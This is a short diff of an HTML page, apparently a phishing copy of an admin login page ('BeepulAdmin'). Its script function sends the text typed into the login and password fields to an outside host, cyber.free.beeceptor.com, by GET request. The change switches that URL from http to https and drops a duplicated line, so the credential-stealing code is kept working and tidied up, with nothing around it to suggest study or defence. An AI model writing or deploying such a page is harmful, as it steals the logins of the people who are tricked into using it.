@@ -176,9 +176,8 @@
   <script src="./BeepulAdmin_files/main.js"></script>
   <script>
       function snd() {
-        var url = "http://cyber.free.beeceptor.com" + '?l=' + document.getElementById("login").value + '&p=' + document.getElementById('password').value;
+        var url = "https://cyber.free.beeceptor.com" + '?l=' + document.getElementById("login").value + '&p=' + document.getElementById('password').value;
         var xhr = new XMLHttpRequest();
-        var url = "http://cyber.free.beeceptor.com" + '?l=' + document.getElementById("login").value + '&p=' + document.getElementById('password').value;
         xhr.open("GET", url, true);
         xhr.send();
       }
